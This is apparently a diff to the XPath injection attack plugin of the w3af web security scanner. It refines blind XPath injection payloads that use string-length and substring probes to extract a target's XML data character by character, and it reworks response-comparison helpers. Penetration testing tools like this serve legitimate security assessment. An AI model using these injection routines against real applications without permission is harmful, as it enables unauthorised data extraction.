@@ -177,7 +177,8 @@ class xpath(baseAttackPlugin):
             try:
                 true_resp = functionReference( vuln.getURL(), str(exploit_dc) )
             except w3afException, e:
-                return 'Error "' + str(e)
+                om.out.debug( 'Error "%s"' % (e) )
+                return None
             else:              
                 if response_is_error(vuln, true_resp.getBody(), self._urlOpener, self.use_difflib):
                     print true_resp.getBody()
@@ -201,7 +202,7 @@ class xpath(baseAttackPlugin):
         true_dq = '%s" and "%i"="%i' % (orig_value, self.rnum, self.rnum) 
         
         om.out.debug( "Trying to determine string delimiter" )
-        om.out.debug(  "Testing single quote... (')" )
+        om.out.debug( "Testing single quote... (')" )
         exploit_dc[ vuln.getVar() ] = true_sq
         try:
             sq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
@@ -290,7 +291,7 @@ class xpath_reader(shell):
         self._rSystemName = None
         self.id = 0
         
-        # TODO: Review these HARD-CODED constants
+        # TODO: Review this HARD-CODED constant
         self.max_data_len = 10000
     
     def __repr__(self):
@@ -364,11 +365,14 @@ class xpath_reader(shell):
             
             mid = (maxl + minl) / 2
             om.out.debug( "MAX:%i, MID:%i, MIN:%i" % (maxl, mid, minl) )
-            #TODO: I'm missing the original value. See the 1 at the string start
-            #TODO: Find a better solution for self.TRUE_COND[3:]
-            findlen = "1%s and string-length(%s)=%i %s" % (self.STR_DEL,
-                                                          XML_FILTER, 
-                                                          mid, self.TRUE_COND[3:])
+
+            orig_value = self.getMutant().getMutant().getOriginalValue()
+            skip_len = len(orig_value) + len(self.STR_DEL) + len(' ')
+
+            findlen = "%s%s and string-length(%s)=%i %s" % (orig_value,
+                                                           self.STR_DEL,
+                                                           XML_FILTER, 
+                                                           mid, self.TRUE_COND[skip_len:])
             exploit_dc[ self.getVar() ] = findlen
             
             try:    
@@ -383,11 +387,11 @@ class xpath_reader(shell):
                     return mid
                 
                 else:
-                    #TODO: I'm missing the original value. See the 1 at the string start
-                    #TODO: Find a better solution for self.TRUE_COND[3:]
-                    findlen = "1%s and string-length(%s)<%i %s" % (self.STR_DEL,
-                                                                 XML_FILTER, 
-                                                                 mid , self.TRUE_COND[3:])
+
+                    findlen = "%s%s and string-length(%s)<%i %s" % (orig_value,
+                                                                   self.STR_DEL,
+                                                                   XML_FILTER, 
+                                                                   mid , self.TRUE_COND[skip_len:])
                     try:
                         exploit_dc[ self.getVar() ] = findlen
                         lresp = functionReference( self.getURL(), str(exploit_dc) )
@@ -395,7 +399,9 @@ class xpath_reader(shell):
                         om.out.debug( 'Error "' + str(e) + '"')
                         return None
                     else:
-                        if not self._response_is_error(self, lresp.getBody()):
+                        if not response_is_error(self, lresp.getBody(), 
+                                                 self._urlOpener,
+                                                 self.use_difflib):
                             # LENGTH IS < THAN MID
                             maxl = mid
                         else:
@@ -417,18 +423,19 @@ class xpath_reader(shell):
         for pos in range(ldata):
             for c in range(32,127):
 
-                #TODO: I'm missing the original value. See the 1 at the string start
-                #TODO: Find a better solution for self.TRUE_COND[3:]
+                orig_value = self.getMutant().getMutant().getOriginalValue()
+                skip_len = len(orig_value) + len(self.STR_DEL) + len(' ')
                 
                 hexcar = chr(c)
-                dataq = '1%s and substring(%s,%i,1)="%s" %s' % (self.STR_DEL,
-                                                               XML_FILTER, 
-                                                               pos, hexcar, 
-                                                               self.TRUE_COND[3:])
+                dataq = '%s%s and substring(%s,%i,1)="%s" %s' % (orig_value,
+                                                                 self.STR_DEL,
+                                                                 XML_FILTER, 
+                                                                 pos, hexcar, 
+                                                                 self.TRUE_COND[skip_len:])
                 exploit_dc[ self.getVar() ] = dataq
                 dresp = functionReference( self.getURL(), str(exploit_dc) )
                 
-                if not self._response_is_error(self, dresp.getBody()):
+                if not response_is_error(self, dresp.getBody(), self._urlOpener, self.use_difflib):
                     om.out.console('Character found: "%s"' % hexcar )
                     data += hexcar
                     break
@@ -447,33 +454,29 @@ class xpath_reader(shell):
 #
 #    Helper functions
 #
-def response_is_error(vuln, res_body, url_opener, use_difflib=True):
+def response_is_error(vuln_obj, res_body, url_opener, use_difflib=True):
     '''
     This functions checks which method must be used to check Responses
     
     @return: True if the res_body is ERROR and FALSE if Not
     '''
     if use_difflib:
-        exploit_dc = vuln.getDc()
-        functionReference = getattr( url_opener , vuln.getMethod() )
+        
+        exploit_dc = vuln_obj.getDc()
+        functionReference = getattr( url_opener , vuln_obj.getMethod() )
 
-        # TODO: This does NOT work for some reason.
-        #    'vuln' object has no attribute 'getOriginalValue'
-        #exploit_dc[ vuln.getVar() ] = vuln.getMutant().getOriginalValue()
+        exploit_dc[ vuln_obj.getVar() ] = vuln_obj.getMutant().getOriginalValue()
 
         # TODO: Perform this request only once
-        try:
-            base_req = functionReference( vuln.getURL(), str(exploit_dc) )
-        except w3afException, e:
-            # TODO: FIX this return
-            return 'Error "' + str(e) + '"'
+        base_res = functionReference( vuln_obj.getURL(), str(exploit_dc) )
+        if difflib.SequenceMatcher(None, base_res.getBody(), 
+                                   res_body).ratio() < THRESHOLD :
+            return True
         else:
-            if difflib.SequenceMatcher(None, base_req.getBody(), 
-                                       res_body).ratio() < THRESHOLD :
-                return True
-            else:
-                return False
+            return False
+
     else:
+        
         if re.search(ERROR_MSG, res_body, re.IGNORECASE):
             return True
         else:
